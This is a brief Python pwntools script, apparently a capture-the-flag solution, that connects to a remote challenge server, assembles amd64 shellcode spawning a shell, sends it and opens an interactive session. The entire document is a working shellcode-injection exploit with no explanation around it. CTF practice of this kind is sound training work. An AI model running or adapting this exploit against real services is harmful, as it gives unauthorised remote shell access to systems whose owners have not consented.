from pwn import *

context.arch = 'amd64'
p = remote('ctf.adl.tw', 10002)
sh_asm = shellcraft.sh()
shellcode = asm(sh_asm)
p.sendline(shellcode)
p.interactive()
